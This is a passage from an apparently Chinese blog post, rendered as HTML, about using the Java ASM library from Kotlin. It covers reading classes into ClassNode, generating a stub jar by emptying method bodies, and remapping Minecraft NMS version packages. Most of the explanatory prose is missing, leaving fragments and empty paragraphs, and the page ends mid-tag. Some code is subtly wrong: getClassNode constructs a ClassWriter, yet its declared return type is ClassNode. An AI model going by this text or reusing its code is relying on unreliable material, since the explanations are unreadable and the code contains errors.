punctuation\">,</span> b<span class=\"token punctuation\">.</span>size<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>asm<code>org/example/asmlearn/ASMLearn_Test</code>mainclassLoadermain</p>\n<blockquote>\n<p> asmasmasmkaptkspasm</p>\n</blockquote>\n<h5 id=\"Tree-API\"><a href=\"#Tree-API\" class=\"headerlink\" title=\"Tree API\"></a>Tree API</h5><p>Tree APICore APITree APIVisitorClassNodeClassNode&#x2F;</p>\n<p>ClassNode</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">fun</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> ClassNode <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">.</span><span class=\"token function\">inputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">)</span>\n    classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>classNode<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> classNode\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>ClassNodeClassVisitorClassVisitor<em><strong>ClassNode</strong></em></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">val</span> classNode <span class=\"token operator\">=</span> <span class=\"token function\">getClassNode</span><span class=\"token punctuation\">(</span>clazzFile<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> methods<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>MethodNode<span class=\"token operator\">></span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>methods\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">val</span> fields<span class=\"token operator\">:</span> List<span class=\"token operator\">&lt;</span>FieldNode<span class=\"token operator\">></span> <span class=\"token operator\">=</span> classNode<span class=\"token punctuation\">.</span>fields<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><p>asm</p>\n<p><a href=\"https://www.bilibili.com/read/cv13433468\">Java ASMMethodVisitorOpcode -  (bilibili.com)</a></p>\n<p></p>\n<h5 id=\"ApiJarGenerator\"><a href=\"#ApiJarGenerator\" class=\"headerlink\" title=\"ApiJarGenerator\"></a>ApiJarGenerator</h5><blockquote>\n<p>Core APICore API</p>\n</blockquote>\n<blockquote>\n<p>JavaJarJar</p>\n<p>&#x2F;JarJar</p>\n<p>asmJVMJar</p>\n</blockquote>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">/**\n * org.example.asmlearn.ApiJarGenerator\n * asm-learn\n *\n * @author \n * @since 2022/7/11 14:22\n */</span>\n<span class=\"token keyword\">fun</span> <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token operator\">:</span> File<span class=\"token punctuation\">,</span> output<span class=\"token operator\">:</span> File<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        output<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">JarOutputStream</span><span class=\"token punctuation\">(</span>output<span class=\"token punctuation\">.</span><span class=\"token function\">outputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token keyword\">out</span> <span class=\"token operator\">-></span>\n        <span class=\"token function\">JarFile</span><span class=\"token punctuation\">(</span>sourceJar<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> jarFile <span class=\"token operator\">-></span>\n            <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span>jarEntry <span class=\"token keyword\">in</span> jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">entries</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                jarFile<span class=\"token punctuation\">.</span><span class=\"token function\">getInputStream</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">&#123;</span> input <span class=\"token operator\">-></span>\n                    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">.</span><span class=\"token function\">endsWith</span><span class=\"token punctuation\">(</span><span class=\"token string\">\".class\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token comment\">// classClassVisitor visit</span>\n                        <span class=\"token keyword\">val</span> classReader <span class=\"token operator\">=</span> <span class=\"token function\">ClassReader</span><span class=\"token punctuation\">(</span>input<span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> classWriter <span class=\"token operator\">=</span> <span class=\"token function\">ClassWriter</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">val</span> visitor <span class=\"token operator\">=</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">)</span>\n                        classReader<span class=\"token punctuation\">.</span><span class=\"token function\">accept</span><span class=\"token punctuation\">(</span>visitor<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        <span class=\"token comment\">// class</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>classWriter<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n                        <span class=\"token keyword\">out</span><span class=\"token punctuation\">.</span><span class=\"token function\">putNextEntry</span><span class=\"token punctuation\">(</span><span class=\"token function\">JarEntry</span><span class=\"token punctuation\">(</span>jarEntry<span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n                        input<span class=\"token punctuation\">.</span><span class=\"token function\">copyTo</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">out</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token punctuation\">&#125;</span>\n                <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyClassVisitor</span><span class=\"token punctuation\">(</span>visitor<span class=\"token operator\">:</span> ClassVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">ClassVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> visitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>\n        access<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span>\n        name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span>\n        exceptions<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> String<span class=\"token operator\">></span><span class=\"token operator\">?</span>\n    <span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> MethodVisitor <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">super</span><span class=\"token punctuation\">.</span><span class=\"token function\">visitMethod</span><span class=\"token punctuation\">(</span>access<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> descriptor<span class=\"token punctuation\">,</span> signature<span class=\"token punctuation\">,</span> exceptions<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token function\">EmptyMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token function\">MethodVisitor</span><span class=\"token punctuation\">(</span>ASM9<span class=\"token punctuation\">,</span> methodVisitor<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIincInsn</span><span class=\"token punctuation\">(</span>`<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> increment<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitIntInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> operand<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitVarInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> `<span class=\"token keyword\">var</span>`<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTypeInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitJumpInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLabel</span><span class=\"token punctuation\">(</span>label<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLdcInsn</span><span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTableSwitchInsn</span><span class=\"token punctuation\">(</span>min<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> max<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> labels<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLookupSwitchInsn</span><span class=\"token punctuation\">(</span>dflt<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> keys<span class=\"token operator\">:</span> IntArray<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> labels<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Label<span class=\"token operator\">></span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMultiANewArrayInsn</span><span class=\"token punctuation\">(</span>descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numDimensions<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitTryCatchBlock</span><span class=\"token punctuation\">(</span>start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> handler<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> type<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLocalVariable</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> signature<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> end<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> index<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitLineNumber</span><span class=\"token punctuation\">(</span>line<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> start<span class=\"token operator\">:</span> Label<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFrame</span><span class=\"token punctuation\">(</span>type<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> numLocal<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> local<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">></span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> numStack<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> stack<span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token keyword\">out</span> Any<span class=\"token operator\">></span><span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitFieldInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitMethodInsn</span><span class=\"token punctuation\">(</span>opcode<span class=\"token operator\">:</span> Int<span class=\"token punctuation\">,</span> owner<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> isInterface<span class=\"token operator\">:</span> Boolean<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">visitInvokeDynamicInsn</span><span class=\"token punctuation\">(</span>name<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> descriptor<span class=\"token operator\">:</span> String<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> bootstrapMethodHandle<span class=\"token operator\">:</span> Handle<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">vararg</span> bootstrapMethodArguments<span class=\"token operator\">:</span> Any<span class=\"token operator\">?</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token function\">generate</span><span class=\"token punctuation\">(</span>\n        <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-2.21.13-J8-jar-with-dependencies.jar\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> \t\t                         <span class=\"token function\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"C:\\\\Users\\\\Rain\\\\Desktop\\\\recaf-empty.jar\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>EmptyClassVisitorvisitMethodEmptyMethodVisitorEmptyMethodVisitorEmptyMethodVisitor</p>\n<h5 id=\"ASMVersionControl\"><a href=\"#ASMVersionControl\" class=\"headerlink\" title=\"ASMVersionControl\"></a>ASMVersionControl</h5><blockquote>\n<p>Minecraft</p>\n<p>minecraftAPI</p>\n<p></p>\n<p>Minecraft 1.16.5<code>net.minecraft.server.v1_16_R3</code></p>\n<p>Minecraft 1.12.2<code>net.minecraft.server.v1_12_R1</code></p>\n<p></p>\n<p><code>n.m.s</code>ASMVersionControl</p>\n<ul>\n<li></li>\n<li></li>\n</ul>\n<p></p>\n<p><code>ASMVersionControl</code>ASMasm<code>n.m.s</code></p>\n</blockquote>\n<p>ASM<code>ClassRemapper</code><code>ClassVisitor</code>ClassVisitor</p>\n<p>ClassRemapper<a href=\"https://github.com/TabooLib/taboolib/blob/master/module/module-nms/src/main/kotlin/taboolib/module/nms/MinecraftRemapper.kt\">taboolib&#x2F;MinecraftRemapper.kt at master  TabooLib&#x2F;taboolib (github.com)</a></p>\n<p>ClassRemapper</p>\n<p></p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\"><span class=\"token comment\">// net.minecraft.server.v1_12_R1</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.12\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token comment\">// net.minecraft.server.v1_16_R3</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Test</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute successfully v1.16\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>net.minecraft.server.v1_12_R1</code><code>net.minecraft.server.v1_16_R3</code></p>\n<p></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>minecraft<span class=\"token punctuation\">.</span>server<span class=\"token punctuation\">.</span>v1_12_R1<span class=\"token punctuation\">.</span>Test\n\n<span class=\"token keyword\">interface</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> NMSHandlerImpl <span class=\"token operator\">:</span> NMSHandler <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">Test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fun</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// asm</span>\n    <span class=\"token keyword\">val</span> nmsProxy<span class=\"token operator\">:</span> NMSHandler <span class=\"token operator\">=</span> createProxyInstance<span class=\"token operator\">&lt;</span>NMSHandler<span class=\"token operator\">></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    nmsProxy<span class=\"token punctuation\">.</span><span class=\"token function\">callTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">//  execute successfully v1.16, </span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>NMSHandlerImpl#callTest</code></p>\n<blockquote>\n<p>   L0<br>    LINENUMBER 85 L0<br>    NEW net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test<br>    DUP<br>    INVOKESPECIAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.<init> ()V<br>    INVOKEVIRTUAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.test ()V<br>   L1<br>    LINENUMBER 86 L1<br>    RETURN<br>   L2<br>    LOCALVARIABLE this Lorg&#x2F;example&#x2F;asmlearn&#x2F;NMSHandlerImpl; L0 L2 0<br>    MAXSTACK &#x3D; 2<br>    MAXLOCALS &#x3D; 1</p>\n</blockquote>\n<p> <code>net/minecraft/server/v1_12_R1/Test</code><code>net/minecraft/server/v1_16_R3/Test</code>visitMethod</p>\n<blockquote>\n<p></p>\n<ul>\n<li><p>NEW net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test</p>\n</li>\n<li><p>INVOKESPECIAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.<init> ()V</p>\n</li>\n<li><p>INVOKEVIRTUAL net&#x2F;minecraft&#x2F;server&#x2F;v1_12_R1&#x2F;Test.test ()V</p>\n</li>\n</ul>\n</blockquote>\n<p><a href=\"https://www.bilibili.com/read/cv13433468\">Java ASMMethodVisitorOpcode -  (bilibili.com)</a></p>\n<p><code>visitTypeInsn</code>, <code>visitMethodInsn</code></p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token keyword\">class</span> <span class=\"token function\">VersionControlMethodVisitor</span><span class=\"token punctuation\">(</span>methodVisitor<span class=\"token operator\">:</span> MethodVisitor<span class=\"token punctuation\">,</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">val</span> currentVersion<span class=\"token operator\">:</span> String<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span 